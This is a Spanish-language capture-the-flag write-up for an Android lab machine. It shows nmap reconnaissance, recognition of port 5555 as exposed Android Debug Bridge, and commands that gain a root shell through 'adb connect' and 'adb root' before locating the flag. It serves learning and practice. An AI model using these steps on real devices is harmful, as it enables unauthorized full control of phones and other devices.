# Reconocimiento
Con `netdiscover` averiguamos la IP objetivo
```
192.168.1.171
```

## Nmap
```zsh
nmap -p 0-65535 -T5 -A -sT -Pn -n 192.168.1.171 -oX scan.xml && xsltproc scan.xml -o scan.html
```
Escaneamos los puertos de la máquina y fingerprinteamos versiones y servicios, luego generamos un reporte que se pueda visualizar cómodamente en el navegador.

```zsh
firefox scan.html ## En terminal no root
```

Nmap flaguea la máquina como un dispositivo Android 10, y solo marca un puerto abierto, el 5555 corriendo un servicio llamado 'freeciv'. Después de investigar un poco veo que es común que nmap lo marque como tal, pero teniendo en cuenta el contexto tiene toda la pinta de que en realidad es ADB (Android Debug Bridge).

## ADB

> Android Debug Bridge (`adb`) is a versatile command-line tool that lets you communicate with a device. The `adb` command facilitates a variety of device actions, such as installing and debugging apps. `adb` provides access to a Unix shell that you can use to run a variety of commands on a device. It is a client-server program that includes three components:
> 	Fuente: https://developer.android.com/tools/adb

`adb` es una herramienta de CLI que permite contectarse de manera remota a un dispositivo Android para debugging, y da una shell Unix.

```zsh
adb connect 192.168.1.171
adb shell
shell@x86_64:/ $ ls
```

Así de sencillo, sin embargo, leyendo el `man` de adb veo que simplemente con `abd root` ganamos una shell privilegiada.

```zsh
130|shell@x86_64:/ $ exit
adb root
adb shell
root@x86_64:/ # id
uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats)
```

Como nunca he visto un tree de archivos de Android no se donde pueden estar las flags, y para no buscar a lo tonto las encuentro con un `find`

```
1|root@x86_64:/ # find  / -name "root.txt"                                     
	...
/data/root/root.txt
```

Asumo que data es algo parecido a `/home` en Linux, pero en `/data/user` no hay flag, así que busco con `find` de nuevo, después de buscar y no encontrar nada pruebo a poner la de root también en el formulario de user (en la web de THL) y es correcta.